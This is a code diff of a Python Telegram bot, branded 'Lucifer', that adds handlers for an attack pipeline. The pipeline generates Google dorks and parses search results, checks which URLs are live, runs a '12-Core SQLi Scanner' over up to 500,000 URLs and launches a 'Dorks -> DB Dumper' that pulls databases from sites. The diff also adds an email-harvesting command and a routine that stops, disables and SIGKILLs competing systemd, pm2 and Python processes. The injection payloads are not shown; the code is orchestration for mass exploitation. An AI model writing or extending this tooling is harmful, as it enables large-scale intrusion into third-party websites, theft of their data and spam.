+                    "🟠 Mistral 7B (OpenRouter)",
+                    callback_data="aigen_mistral")],
+                [InlineKeyboardButton(
+                    "🟣 LLaMA 3.1 8B — FREE",
+                    callback_data="aigen_llama")],
+                [InlineKeyboardButton(
+                    "🔴 DeepSeek R1 — FREE",
+                    callback_data="aigen_deepseek")],
+            ]),
+        )
+
+    # ── aigen callback — fires when provider button tapped ───────────────────
+    async def aigen_callback(update, ctx):
+        query    = update.callback_query
+        provider = query.data.replace("aigen_", "")
+        prompt   = ctx.user_data.get("aigen_prompt", "")
+        uid      = query.from_user.id
+
+        if not has_access(uid):
+            await query.answer("❌ Access denied", show_alert=True)
+            return
+
+        if not prompt:
+            await query.answer("❌ Prompt missing — use /aigen again", show_alert=True)
+            return
+
+        _labels = {
+            "anthropic": "Claude Sonnet",
+            "gemini":    "Gemini 1.5 Flash",
+            "gpt4o":     "GPT-4o",
+            "mistral":   "Mistral 7B",
+            "llama":     "LLaMA 3.1 8B",
+            "deepseek":  "DeepSeek R1",
+        }
+        _label = _labels.get(provider, provider)
+
+        await query.edit_message_text(
+            f"⚔️ *AI Keywords Generator*\n\n"
+            f"🤖 Provider: `{_label}`\n"
+            f"📝 Prompt: `{prompt[:60]}`\n\n"
+            f"⏳ Generating 600+ keywords...",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+
+        kws, err = await _ai_generate_keywords(prompt, provider)
+
+        if err or not kws:
+            await query.edit_message_text(
+                f"❌ *Error:* `{err or 'Empty response'}`\n\n"
+                f"Check API key for this provider.\n"
+                f"Set keys: see /apikeys command",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+            return
+
+        ts      = datetime.now().strftime("%d%m%y_%H%M")
+        content = "\n".join(kws).encode("utf-8")
+        await query.message.reply_document(
+            document=io.BytesIO(content),
+            filename=f"lucifer_keywords_{len(kws)}_{ts}.txt",
+            caption=(
+                f"⚔️ *AI Keywords Generated*\n"
+                f"├ 🤖 Provider: `{_label}`\n"
+                f"├ 🔑 Total: `{len(kws):,}`\n"
+                f"├ 🎯 Topic: `{prompt[:40]}`\n"
+                f"└ ⚔️ Lᴜᴄɪꜰᴇʀ AI"
+            ),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        await query.delete_message()
+
+    # ── /apikeys — show which keys are set ───────────────────────────────────
+    async def apikeys_cmd(update, ctx):
+        uid = update.effective_user.id
+        if not is_admin(uid):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        def _status(k): return "✅ Set" if k else "❌ Missing"
+        await update.message.reply_text(
+            "⚔️ *AI Provider API Keys*\n\n"
+            f"🔵 Anthropic: `{_status(_ANTHROPIC_KEY)}`\n"
+            f"🟢 Gemini:    `{_status(_GEMINI_KEY)}`\n"
+            f"🟡 OpenRouter: `{_status(_OPENROUTER_KEY)}`\n\n"
+            "To set keys on VPS:\n"
+            "```\n"
+            "echo \'export ANTHROPIC_API_KEY=sk-ant-...\' >> ~/.bashrc\n"
+            "echo \'export GEMINI_API_KEY=AIza...\' >> ~/.bashrc\n"
+            "echo \'export OPENROUTER_API_KEY=sk-or-...\' >> ~/.bashrc\n"
+            "source ~/.bashrc\n"
+            "```\n"
+            "_Then restart bot_",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+
+    async def emails_cmd(update, ctx):
+        if not has_access(update.effective_user.id):
+            await update.message.reply_text("❌ Access denied.")
+            return
+        doc = None
+        if update.message.reply_to_message and update.message.reply_to_message.document:
+            doc = update.message.reply_to_message.document
+        elif update.message.document:
+            doc = update.message.document
+        if not doc:
+            await update.message.reply_text(
+                "📎 Reply to a `.txt` file with `/emails` to harvest emails.",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+            return
+        msg = await update.message.reply_text("📧 Extracting emails...")
+        f   = await ctx.bot.get_file(doc.file_id)
+        raw = await f.download_as_bytearray()
+        text = raw.decode("utf-8", errors="ignore")
+        emails = _extract_emails(text)
+        if not emails:
+            await msg.edit_text("❌ No emails found in file.")
+            return
+        ts = datetime.now().strftime("%d%m%y_%H%M")
+        content = "\n".join(emails).encode("utf-8")
+        await msg.delete()
+        await update.message.reply_document(
+            document=io.BytesIO(content),
+            filename=f"lucifer_emails_{len(emails)}_{ts}.txt",
+            caption=(
+                f"⚔️ Eᴍᴀɪʟ Hᴀʀᴠᴇsᴛ Rᴇsᴜʟᴛ\n"
+                f"├ 📧 Total: `{len(emails):,}`\n"
+                f"└ 🌑 Lᴜᴄɪꜰᴇʀ Bᴏᴛ"
+            ),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+
+    # ── /livefeed — admin sees all active sessions ───────────────────────────
+    async def livefeed_cmd(update, ctx):
+        uid = update.effective_user.id
+        if not is_admin(uid):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        if not _LIVE_FEED:
+            await update.message.reply_text("💤 No active sessions right now.")
+            return
+        lines = ["⚔️━━━━━━━━━━━━━━━━━━━━⚔️", "👁️ 𝗟𝗜𝗩𝗘 𝗙𝗘𝗘𝗗", "⚔️━━━━━━━━━━━━━━━━━━━━⚔️\n"]
+        for i, (sid, s) in enumerate(_LIVE_FEED.items(), 1):
+            lines.append(
+                f"*{i}. {s.get('name','?')}* (`{sid}`)\n"
+                f"  {s.get('phase','?')} | Started: `{s.get('start','?')}`\n"
+                f"  Dorks: `{s.get('dorks_done',0):,}/{s.get('dorks_total',0):,}` "
+                f"| URLs: `{s.get('urls_found',0):,}`\n"
+            )
+        await update.message.reply_text(
+            "\n".join(lines),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+
+    # ── /aigen — AI keyword generator via Anthropic API ─────────────────────
+
+    # ── /statuscheck — filter URLs by HTTP status ────────────────────────────
+    async def statuscheck_cmd(update, ctx):
+        if not has_access(update.effective_user.id):
+            await update.message.reply_text("❌ Access denied.")
+            return
+        doc = None
+        if update.message.reply_to_message and update.message.reply_to_message.document:
+            doc = update.message.reply_to_message.document
+        elif update.message.document:
+            doc = update.message.document
+        if not doc:
+            await update.message.reply_text(
+                "📎 Reply to a URLs `.txt` file with `/statuscheck`\n"
+                "Filters: keeps only HTTP 200/301/302/500 URLs.",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+            return
+        msg = await update.message.reply_text("⚡ Checking URL statuses...")
+        raw  = await (await ctx.bot.get_file(doc.file_id)).download_as_bytearray()
+        urls = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip().startswith("http")]
+        if not urls:
+            await msg.edit_text("❌ No URLs found in file.")
+            return
+        await msg.edit_text(f"⚡ Checking `{len(urls):,}` URLs...")
+        _live_urls, _dead = [], 0
+        _sem = asyncio.Semaphore(200)
+        async def _chk(url):
+            nonlocal _dead
+            async with _sem:
+                try:
+                    async with aiohttp.ClientSession() as _s:
+                        async with _s.get(url, timeout=aiohttp.ClientTimeout(total=6),
+                                         allow_redirects=True, ssl=False) as _r:
+                            if _r.status in (200, 201, 301, 302, 403, 500):
+                                _live_urls.append(url)
+                            else:
+                                _dead += 1
+                except Exception:
+                    _dead += 1
+        await asyncio.gather(*[_chk(u) for u in urls], return_exceptions=True)
+        if not _live_urls:
+            await msg.edit_text("❌ No live URLs found.")
+            return
+        ts = datetime.now().strftime("%d%m%y_%H%M")
+        content = "\n".join(_live_urls).encode("utf-8")
+        await msg.delete()
+        await update.message.reply_document(
+            document=io.BytesIO(content),
+            filename=f"lucifer_live_{len(_live_urls)}_{ts}.txt",
+            caption=(
+                f"⚔️ Sᴛᴀᴛᴜs Fɪʟᴛᴇʀ Rᴇsᴜʟᴛ\n"
+                f"├ ✅ Live: `{len(_live_urls):,}`\n"
+                f"├ ❌ Dead: `{_dead:,}`\n"
+                f"└ ⚔️ Lᴜᴄɪꜰᴇʀ Bᴏᴛ"
+            ),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+
     async def _auto_proxy_cleaner():
         """24/7 V7 Self-Healing Proxy Guardian: maintains >= min_proxies (default 1000) under ALL conditions."""
         await _auto_proxy_guardian_loop()
+
+    app.add_handler(CommandHandler("aigen",         aigen_cmd), group=-1)
+    app.add_handler(CommandHandler("apikeys",       apikeys_cmd), group=-1)
+    app.add_handler(CommandHandler("emails",        emails_cmd), group=-1)
+    app.add_handler(CommandHandler("harvestemails", emails_cmd), group=-1)
+    app.add_handler(CommandHandler("livefeed",      livefeed_cmd), group=-1)
+    app.add_handler(CommandHandler("statuscheck",   statuscheck_cmd), group=-1)
+    app.add_handler(CommandHandler("scfilter",      statuscheck_cmd), group=-1)
+    app.add_handler(CallbackQueryHandler(
+        aigen_callback,
+        pattern=r"^aigen_(anthropic|gemini|gpt4o|mistral|llama|deepseek)$",
+    ), group=-1)
 
     async def _run_bot():
         loop = asyncio.get_running_loop()
@@ -10697,15 +9249,18 @@ def main():
             try:
                 async with app:
                     await app.start()
-                    await app.updater.start_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
+                    await app.updater.start_polling(drop_pending_updates=False, allowed_updates=Update.ALL_TYPES)
                     _V11_CORE_IMMORTAL_TASKS.update(asyncio.all_tasks())
-                    logger.info("🕷️ Bᴏᴛ Pᴏʟʟɪɴɢ Sᴛᴀʀᴛᴇᴅ (ZERO-LAG MODE | FD=%s)", _V11_FD_LIMITS)
+                    logger.info("🕷️ Bᴏᴛ Pᴏʟʟɪɴɢ Sᴛᴀʀᴛᴇᴅ [%s | ZERO-LAG | PERSISTENT STATE | FD=%s]", _V12_VERSION_TAG, _V11_FD_LIMITS)
                     await asyncio.Event().wait()
             except asyncio.CancelledError:
                 break
             except Exception as _bot_err:
-                logger.error("🛡️ Polling loop error — auto-recovering in 4s: %s", _bot_err)
-                await asyncio.sleep(4)
+                if "Conflict" in str(_bot_err):
+                    logger.warning("🛡️ Conflict detected — purging duplicate poller immediately!")
+                    _v12_purge_competing_services_and_processes()
+                logger.error("🛡️ Polling loop error — auto-recovering in 2s: %s", _bot_err)
+                await asyncio.sleep(2)
 
     async def _run_all():
         await asyncio.gather(_run_keepalive(), _self_ping(), _run_bot(), _auto_save(), _auto_proxy_cleaner(), return_exceptions=True)
@@ -13356,18 +11911,6 @@ async def url_dump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         )
         urls = urls[:500_000]
     return await _run_url_dump_pipeline(update, context, urls)
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -16626,6 +15169,674 @@ if "--v11-proxy-once" in _v11_sys.argv:
     asyncio.run(_v11_fast_subprocess_proxy_pass())
     _v11_sys.exit(0)
 # ==================== END V11 ZERO-LAG ISOLATED ENGINE + NUCLEAR TASK KILLER ====================
+
+
+
+
+
+
+
+
+# ==================== V12 BULLETPROOF PERSISTENT ROUTER & SINGLE-INSTANCE ENGINE ====================
+import fcntl as _v12_fcntl
+import hashlib as _v12_hashlib
+import warnings as _v12_warnings
+from telegram.ext import ApplicationHandlerStop
+
+try:
+    from telegram.warnings import PTBUserWarning as _V12PTBUserWarning
+    _v12_warnings.filterwarnings("ignore", category=_V12PTBUserWarning)
+except Exception:
+    pass
+
+_V12_VERSION_TAG = "V12-IMMORTAL"
+_V12_STATE_FILE = os.path.join("data", "v12_user_states.json")
+_V12_LOCK_FD = None
+_V12_CONV_REF = None
+_V12_PERSISTED_STATES: dict[str, dict] = {}
+_V12_BOOT_EPOCH = time.time()
+
+
+def _v12_purge_competing_services_and_processes() -> list[str]:
+    """
+    Stops competing `systemd` / `pm2` / `supervisor` bot units (when running
+    outside that unit) and terminates any duplicate `bot.py` / `main.py`
+    processes so ONLY ONE single bot instance polls `getUpdates`!
+    """
+    actions: list[str] = []
+    my_pid = os.getpid()
+    parent_pid = os.getppid()
+    my_invocation = os.environ.get("INVOCATION_ID", "").strip()
+    token_str = str(globals().get("TOKEN", "") or "")
+    bot_dir = os.path.dirname(os.path.abspath(__file__))
+
+    # 1. Check competing systemd units that would auto-respawn (`Restart=always`) old V9 processes
+    if not my_invocation and shutil.which("systemctl"):
+        unit_dirs = ["/etc/systemd/system", "/lib/systemd/system", "/run/systemd/system"]
+        suspect_units: set[str] = set()
+        for udir in unit_dirs:
+            if not os.path.isdir(udir):
+                continue
+            for fn in os.listdir(udir):
+                if not fn.endswith(".service"):
+                    continue
+                fpath = os.path.join(udir, fn)
+                try:
+                    with open(fpath, "r", encoding="utf-8", errors="ignore") as uf:
+                        txt = uf.read()
+                    if (
+                        bot_dir in txt
+                        or "/spidey/" in txt
+                        or (token_str and len(token_str) > 15 and token_str in txt)
+                        or re.search(r"python3?\s+.*?(?:bot|main|bot_fixed)\.py", txt)
+                    ):
+                        suspect_units.add(fn)
+                except Exception:
+                    pass
+
+        for unit in sorted(suspect_units):
+            for prefix in ([], ["sudo", "-n"]):
+                try:
+                    st = subprocess.run(
+                        prefix + ["systemctl", "is-active", unit],
+                        capture_output=True, text=True, timeout=4,
+                    )
+                    if st.stdout.strip() in ("active", "activating", "reloading"):
+                        subprocess.run(prefix + ["systemctl", "stop", unit], capture_output=True, timeout=8)
+                        subprocess.run(prefix + ["systemctl", "disable", unit], capture_output=True, timeout=8)
+                        actions.append(f"Stopped & disabled competing systemd service `{unit}`")
+                        break
+                except Exception:
+                    continue
+
+    # 2. Check competing PM2 / Supervisor entries if installed
+    if shutil.which("pm2") and not os.environ.get("PM2_HOME"):
+        try:
+            out = subprocess.run(["pm2", "jlist"], capture_output=True, text=True, timeout=4)
+            if out.returncode == 0 and out.stdout.strip().startswith("["):
+                for item in json.loads(out.stdout):
+                    script_p = str(((item.get("pm2_env") or {}).get("pm_exec_path")) or "")
+                    name_p = str(item.get("name") or "")
+                    if any(x in script_p for x in ("bot.py", "main.py", "bot_fixed.py", "/spidey")):
+                        subprocess.run(["pm2", "delete", name_p], capture_output=True, timeout=5)
+                        actions.append(f"Removed competing PM2 process `{name_p}`")
+        except Exception:
+            pass
+
+    # 3. Terminate ALL other running Python processes for this bot across `/proc`
+    killed = 0
+    for entry in os.listdir("/proc"):
+        if not entry.isdigit():
+            continue
+        pid = int(entry)
+        if pid in (my_pid, parent_pid, 1):
+            continue
+        try:
+            with open(f"/proc/{pid}/cmdline", "rb") as f:
+                args = [p.decode("utf-8", "ignore") for p in f.read().split(b"\x00") if p]
+            if not args:
+                continue
+            cmd_str = " ".join(args)
+            if "--v11-proxy-once" in cmd_str or "hyper_" in cmd_str or "patch_" in cmd_str:
+                continue
+            is_python = "python" in os.path.basename(args[0]).lower()
+            has_bot_target = any(
+                os.path.basename(a) in ("bot.py", "main.py", "bot_fixed.py") or "/spidey/" in a
+                for a in args[1:]
+            )
+            if is_python and has_bot_target:
+                try:
+                    os.killpg(os.getpgid(pid), signal.SIGKILL)
+                except Exception:
+                    try:
+                        os.kill(pid, signal.SIGKILL)
+                    except Exception:
+                        pass
+                killed += 1
+        except Exception:
+            continue
+
+    if killed:
+        actions.append(f"Killed {killed} duplicate background bot process(es)")
+        time.sleep(1.0)
+
+    # 4. Acquire Exclusive Single-Instance File Lock
+    global _V12_LOCK_FD
+    tok_hash = _v12_hashlib.sha1(token_str.encode("utf-8", "ignore")).hexdigest()[:10]
+    lock_path = f"/tmp/spidey_v12_instance_{tok_hash}.lock"
+    try:
+        fd = open(lock_path, "w", encoding="utf-8")
+        _v12_fcntl.flock(fd.fileno(), _v12_fcntl.LOCK_EX | _v12_fcntl.LOCK_NB)
+        fd.write(f"{my_pid}\n")
+        fd.flush()
+        _V12_LOCK_FD = fd
+    except Exception:
+        pass
+
+    return actions
+
+
+# ── ATOMIC DISK CONVERSATION STATE + `user_data` PERSISTENCE ─────────────────
+_V12_SAVE_KEYS = (
+    "kw_count", "dork_count", "dork_type", "aigen_prompt", "vault_uid", "rf_mode",
+)
+
+
+def _v12_load_states_from_disk() -> dict[str, dict]:
+    global _V12_PERSISTED_STATES
+    try:
+        if os.path.isfile(_V12_STATE_FILE):
+            with open(_V12_STATE_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            if isinstance(data, dict):
+                _V12_PERSISTED_STATES = data
+                return data
+    except Exception:
+        pass
+    _V12_PERSISTED_STATES = {}
+    return _V12_PERSISTED_STATES
+
+
+def _v12_save_states_to_disk() -> None:
+    try:
+        os.makedirs(os.path.dirname(_V12_STATE_FILE), exist_ok=True)
+        tmp = f"{_V12_STATE_FILE}.tmp.{os.getpid()}"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(_V12_PERSISTED_STATES, f)
+        os.replace(tmp, _V12_STATE_FILE)
+    except Exception:
+        pass
+
+
+def _v12_record_user_state(chat_id: int | None, user_id: int | None, state: object, user_data: dict | None = None) -> None:
+    if not user_id:
+        return
+    cid = int(chat_id or user_id)
+    uid = int(user_id)
+    k = f"{cid}:{uid}"
+    rec = _V12_PERSISTED_STATES.get(k) or {}
+    if isinstance(state, int):
+        rec["state"] = state
+    elif state is None:
+        rec.pop("state", None)
+    if isinstance(user_data, dict):
+        ud_clean = dict(rec.get("ud") or {})
+        for uk in _V12_SAVE_KEYS:
+            if uk in user_data and isinstance(user_data[uk], (int, float, str, bool, list, dict)):
+                ud_clean[uk] = user_data[uk]
+        rec["ud"] = ud_clean
+    rec["ts"] = round(time.time(), 2)
+    _V12_PERSISTED_STATES[k] = rec
+    _v12_save_states_to_disk()
+
+
+class _V12PersistentConversationHandler(ConversationHandler):
+    __slots__ = ("_v12_app",)
+
+    def _update_state(self, new_state, key, handler=None):
+        res = super()._update_state(new_state, key, handler)
+        try:
+            if isinstance(key, tuple) and len(key) >= 2:
+                cid, uid = int(key[0]), int(key[1])
+                ud_live = dict((self._v12_app.user_data.get(uid) if getattr(self, "_v12_app", None) else None) or {})
+                eff_state = self._conversations.get(key)
+                _v12_record_user_state(cid, uid, eff_state if isinstance(eff_state, int) else MENU, ud_live)
+        except Exception:
+            pass
+        return res
+
+
+def _v12_bind_persistent_conversation(conv_obj, app_obj) -> None:
+    """
+    Pre-hydrates saved disk states + `user_data` into `conv_obj._conversations`
+    and `app_obj._user_data` across complete process restarts!
+    """
+    global _V12_CONV_REF
+    _V12_CONV_REF = conv_obj
+    conv_obj._v12_app = app_obj
+    saved = _v12_load_states_from_disk()
+    valid_states = set(conv_obj.states.keys()) | {MENU}
+
+    for k, rec in list(saved.items()):
+        try:
+            cid_s, uid_s = k.split(":", 1)
+            cid, uid = int(cid_s), int(uid_s)
+            st = rec.get("state")
+            if isinstance(st, int) and st in valid_states:
+                conv_obj._conversations[(cid, uid)] = st
+            ud = rec.get("ud")
+            if isinstance(ud, dict) and ud:
+                app_obj._user_data[uid].update(ud)
+        except Exception:
+            continue
+
+
+_V12_USER_TASKS: dict[int, set[asyncio.Task]] = {}
+
+
+# ── NON-BLOCKING BACKGROUND PIPELINE SPAWNER (ALL SCANS RETURN `MENU` IN 0.001s!) ──
+def _v12_spawn_bg_pipeline(uid: int, label: str, coro) -> int:
+    """
+    Schedules `coro` as an isolated background `asyncio.Task` and returns `MENU`
+    IMMEDIATELY (`0.001s`) so:
+      • `ConversationHandler` NEVER stays locked inside a scan state!
+      • Completing a long scan NEVER clobbers a newer state the user entered!
+      • `/stop`, `/killall`, and `☢️ FORCE KILL ALL TASKS` cancel it in `<80ms`!
+    """
+    async def _runner():
+        cur = asyncio.current_task()
+        bucket = _V12_USER_TASKS.setdefault(int(uid), set())
+        if cur is not None:
+            bucket.add(cur)
+        try:
+            await coro
+        except asyncio.CancelledError:
+            logger.info("🛑 Cancelled task [%s] for user %s", label, uid)
+        except Exception as exc:
+            logger.exception("🛡️ Task error inside [%s] for user %s: %s", label, uid, exc)
+        finally:
+            if cur is not None:
+                bucket.discard(cur)
+
+    asyncio.create_task(_runner(), name=f"v12_job_{uid}_{label}")
+    return MENU
+
+
+# ── UPGRADED NON-BLOCKING HANDLERS ACROSS ALL 19 CONVERSATION STATES ─────────
+async def kw_get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    try:
+        count = _v8_parse_human_count(update.message.text)
+    except Exception:
+        await update.message.reply_text("❌ Eɴᴛᴇʀ A Vᴀʟɪᴅ Nᴜᴍʙᴇʀ. E.g. `10000`, `50000`, `1lakh`, `10lakh`", parse_mode=ParseMode.MARKDOWN)
+        return KW_WAIT_COUNT
+    count = min(count, 2_000_000)
+    context.user_data["kw_count"] = count
+    _v12_record_user_state(update.effective_chat.id, uid, KW_WAIT_SEEDS, context.user_data)
+    await update.message.reply_text(
+        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+        f"✅ 𝘾𝙤𝙪𝙣𝙩 𝙎𝙚𝙩: `{count:,}` (100% Exact Output!).\n"
+        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
+        "📤 Nᴏᴡ Sᴇɴᴅ Yᴏᴜʀ *Sᴇᴇᴅ Bʀᴀɴᴅs/Kᴇʏᴡᴏʀᴅs*:\n"
+        "• Sᴇɴᴅ Tʜᴇᴍ Sᴇᴘᴀʀᴀᴛᴇᴅ Bʏ Nᴇᴡʟɪɴᴇs Oʀ Cᴏᴍᴍᴀs\n"
+        "• Oʀ Sᴇɴᴅ A `.txt` / `.zip` Fɪʟᴇ (Oɴᴇ Pᴇʀ Lɪɴᴇ)",
+        reply_markup=back_button(),
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return KW_WAIT_SEEDS
+
+
+async def kw_get_seeds_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    context.user_data.setdefault("kw_count", 10_000)
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    seeds = [s.strip() for s in raw_text.replace(",", "\n").splitlines() if s.strip()]
+    if not seeds:
+        await update.message.reply_text("❌ Nᴏ Sᴇᴇᴅs Fᴏᴜɴᴅ Iɴ Fɪʟᴇ.", parse_mode=ParseMode.MARKDOWN)
+        return KW_WAIT_SEEDS
+    return _v12_spawn_bg_pipeline(uid, "Keyword Generator", _run_keyword_gen(update, context, seeds))
+
+
+async def kw_get_seeds_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    seeds = [s.strip() for s in (update.message.text or "").replace(",", "\n").splitlines() if s.strip()]
+    if not seeds:
+        await update.message.reply_text("❌ Pʟᴇᴀsᴇ Sᴇɴᴅ Aᴛ Lᴇᴀsᴛ Oɴᴇ Sᴇᴇᴅ Kᴇʏᴡᴏʀᴅ.")
+        return KW_WAIT_SEEDS
+    return _v12_spawn_bg_pipeline(uid, "Keyword Generator", _run_keyword_gen(update, context, seeds))
+
+
+async def dork_get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    try:
+        count = _v8_parse_human_count(update.message.text)
+    except Exception:
+        await update.message.reply_text("❌ Eɴᴛᴇʀ A Vᴀʟɪᴅ Nᴜᴍʙᴇʀ. E.g. `10000`, `50000`, `1lakh`, `10lakh`", parse_mode=ParseMode.MARKDOWN)
+        return DORK_WAIT_COUNT
+    count = min(count, 5_000_000)
+    context.user_data["dork_count"] = count
+    _v12_record_user_state(update.effective_chat.id, uid, DORK_WAIT_KEYWORDS, context.user_data)
+    await update.message.reply_text(
+        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+        f"✅ Cᴏᴜɴᴛ Sᴇᴛ: `{count:,}` Dᴏʀᴋs (Exact!).\n"
+        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
+        "🔰 Pʜᴀsᴇ 2:\n"
+        "• Sᴇɴᴅ Yᴏᴜʀ *Kᴇʏᴡᴏʀᴅs* (Tᴇxᴛ Oʀ `.txt` / `.zip` Fɪʟᴇ):",
+        reply_markup=back_button(),
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return DORK_WAIT_KEYWORDS
+
+
+async def dork_get_keywords_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    context.user_data.setdefault("dork_count", 10_000)
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    keywords = [k.strip() for k in raw_text.replace(",", "\n").splitlines() if k.strip()]
+    if not keywords:
+        await update.message.reply_text("❌ Nᴏ Kᴇʏᴡᴏʀᴅs Fᴏᴜɴᴅ Iɴ Fɪʟᴇ.", parse_mode=ParseMode.MARKDOWN)
+        return DORK_WAIT_KEYWORDS
+    return _v12_spawn_bg_pipeline(uid, "Dork Generator", _run_dork_gen(update, context, keywords))
+
+
+async def dork_get_keywords_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    keywords = [k.strip() for k in (update.message.text or "").replace(",", "\n").splitlines() if k.strip()]
+    if not keywords:
+        await update.message.reply_text("❌ Pʟᴇᴀsᴇ Sᴇɴᴅ Aᴛ Lᴇᴀsᴛ Oɴᴇ Kᴇʏᴡᴏʀᴅ.")
+        return DORK_WAIT_KEYWORDS
+    return _v12_spawn_bg_pipeline(uid, "Dork Generator", _run_dork_gen(update, context, keywords))
+
+
+async def parser_get_dorks_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    dorks = [d.strip() for d in raw_text.splitlines() if d.strip()]
+    if not dorks:
+        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ Iɴ Fɪʟᴇ.", parse_mode=ParseMode.MARKDOWN)
+        return PARSER_WAIT_DORKS
+    return _v12_spawn_bg_pipeline(uid, "Deep Search Parser", _run_parser(update, context, dorks))
+
+
+async def parser_get_dorks_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    dorks = [d.strip() for d in (update.message.text or "").splitlines() if d.strip()]
+    if not dorks:
+        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ.")
+        return PARSER_WAIT_DORKS
+    return _v12_spawn_bg_pipeline(uid, "Deep Search Parser", _run_parser(update, context, dorks))
+
+
+async def sqli_get_urls_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    urls = [u.strip() for u in raw_text.splitlines() if u.strip().startswith("http")]
+    if not urls:
+        await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. URLs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http/https.")
+        return SQLI_WAIT_URLS
+    return _v12_spawn_bg_pipeline(uid, "12-Core SQLi Scanner", _run_sqli(update, context, urls[:500_000]))
+
+
+async def sqli_get_urls_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    urls = [u.strip() for u in (update.message.text or "").splitlines() if u.strip().startswith("http")]
+    if not urls:
+        await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. URLs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http/https.")
+        return SQLI_WAIT_URLS
+    return _v12_spawn_bg_pipeline(uid, "12-Core SQLi Scanner", _run_sqli(update, context, urls[:500_000]))
+
+
+async def dump_get_dorks_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    dorks = [d.strip() for d in raw_text.splitlines() if d.strip()]
+    if not dorks:
+        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ.")
+        return DUMP_WAIT_DORKS
+    return _v12_spawn_bg_pipeline(uid, "Dorks -> DB Dumper", _run_dump_pipeline(update, context, dorks))
+
+
+async def dump_get_dorks_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    dorks = [d.strip() for d in (update.message.text or "").splitlines() if d.strip()]
+    if not dorks:
+        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ.")
+        return DUMP_WAIT_DORKS
+    return _v12_spawn_bg_pipeline(uid, "Dorks -> DB Dumper", _run_dump_pipeline(update, context, dorks))
+
+
